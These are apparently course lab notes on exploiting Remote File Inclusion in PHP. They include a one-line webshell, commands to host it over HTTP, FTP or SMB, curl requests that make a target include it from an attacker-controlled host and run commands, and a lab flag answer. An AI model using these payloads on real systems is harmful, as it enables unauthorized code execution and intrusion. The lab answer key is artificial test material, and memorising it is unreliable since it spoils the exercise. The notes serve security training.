## ID
<!-- TODO: assign correct ID from your File Inclusion module range -->

## Module
File Inclusion

## Kind
notes

## Title
Section 6 — Remote File Inclusion (RFI)

## Description
Exploiting RFI to achieve RCE by hosting a malicious PHP webshell and including it via HTTP, FTP, or SMB on a vulnerable PHP application with allow_url_include enabled.

## Tags
lfi, rfi, rce, php, webshell, ssrf

## Commands
- echo '<?php system($_GET["cmd"]); ?>' > shell.php
- sudo python3 -m http.server 80
- sudo python -m pyftpdlib -p 21
- impacket-smbserver -smb2support share $(pwd)
- curl -s 'http://<TARGET>/index.php?language=http://<PWNIP>/shell.php&cmd=ls+/' | grep -v "<.*>"
- curl -s 'http://<TARGET>/index.php?language=ftp://<PWNIP>/shell.php&cmd=id' | grep -v "<.*>"
- curl -s 'http://<TARGET>/index.php?language=http://127.0.0.1:80/index.php'

## What This Section Covers
RFI goes one step further than LFI — instead of reading local files, you make the server fetch and execute a script you host. This requires `allow_url_include = On` (same check as the data:// wrapper). The attacker hosts a PHP webshell on their own machine and passes its URL to the vulnerable parameter; the server fetches it, executes it, and returns the output. HTTP, FTP, and SMB are all viable delivery channels, each useful in different firewall/WAF scenarios.

## Methodology
1. **Confirm allow_url_include = On** — read php.ini via LFI + base64 filter and grep (same as Section 5).
2. **Verify RFI is possible** — test with a local URL first to check firewall rules aren't blocking outbound: `?language=http://127.0.0.1:80/index.php`. If the page includes itself, RFI works.
3. **Create the webshell** — `echo '<?php system($_GET["cmd"]); ?>' > shell.php`
4. **Host the webshell** — choose a channel:
   - HTTP: `sudo python3 -m http.server 80` (port 80/443 most likely whitelisted)
   - FTP: `sudo python -m pyftpdlib -p 21`
   - SMB (Windows targets only): `impacket-smbserver -smb2support share $(pwd)`
5. **Include and execute** — pass your IP + shell path to the vulnerable parameter + `&cmd=<CMD>`
6. **Find the flag** — `cmd=ls+/` first, then `cmd=cat+/<file>`

## Multi-step Workflow

```bash
# Step 1 — verify allow_url_include (reuse from Section 5)
curl -s 'http://<TARGET>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini' \
  | grep "W1BI" | sed 's/ \{12\}//g' | sed 's/<p class="read-more">//g' | base64 -d | grep allow_url_include

# Step 2 — test RFI with loopback
curl -s 'http://<TARGET>/index.php?language=http://127.0.0.1:80/index.php'

# Step 3 — create webshell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Step 4 — host it (run in background or separate terminal)
sudo python3 -m http.server 80

# Step 5 — RFI via HTTP: list /
curl -s 'http://<TARGET>/index.php?language=http://<PWNIP>/shell.php&cmd=ls+/' | grep -v "<.*>"

# Step 6 — cat the flag
curl -s 'http://<TARGET>/index.php?language=http://<PWNIP>/shell.php&cmd=cat+/<FLAGFILE>' | grep -v "<.*>"

# --- Alternatives ---

# FTP delivery (if HTTP is blocked)
sudo python -m pyftpdlib -p 21
curl -s 'http://<TARGET>/index.php?language=ftp://<PWNIP>/shell.php&cmd=id' | grep -v "<.*>"

# SMB delivery (Windows targets only — no allow_url_include needed)
impacket-smbserver -smb2support share $(pwd)
curl -s 'http://<TARGET>/index.php?language=\\<PWNIP>\share\shell.php&cmd=whoami' | grep -v "<.*>"
```

## LFI vs RFI — Key Difference

| | LFI | RFI |
|---|---|---|
| File source | Local server disk | Remote URL (attacker-hosted) |
| Needs allow_url_include | No (for reading) | Yes (HTTP/FTP) |
| Code execution | Via wrappers/log poison | Direct — server fetches+runs your script |
| Works on Windows without allow_url_include | No | Yes, via SMB UNC path |

## Lab — Questions & Answers

| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Flag under a directory in / | `99a8fc05f033f2fc0cf9a6f9826f83f4` | RFI via HTTP (port 81) → shell.php → `ls /` → spotted `/exercise/` → `ls /exercise` → `cat /exercise/<file>` |

## Key Takeaways
- RFI = the server makes an outbound request to YOU — you serve the malicious code, the server executes it.
- Always test with `http://127.0.0.1:80/index.php` first — confirms RFI works without exposing your IP prematurely.
- Host on port 80 or 443 — outbound connections to these are far less likely to be firewalled than random high ports.
- SMB is the only method that works on Windows **without** `allow_url_include` — useful to know for mixed environments.
- If you see an extra `.php` appended in your python server logs (e.g. `GET /shell.php.php`), omit `.php` from your URL.
- Almost every RFI is also an LFI — but not vice versa.

## Gotchas
- Don't include the vulnerable page itself via RFI (`index.php`) — it creates a recursive loop and can DoS the server.
- FTP anonymous auth works by default with pyftpdlib; only add `user:pass@` to the URL if the server demands credentials.
- SMB RFI over the internet is often blocked — reliable mostly on internal/same-network targets.
- `allow_url_include` check via php.ini is necessary but not sufficient — always do the loopback test to confirm end-to-end.


<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|file-inclusion]]  
← [[05-php-wrappers]] | [[07-lfi-and-file-uploads]] →
<!-- AUTO-LINKS-END -->
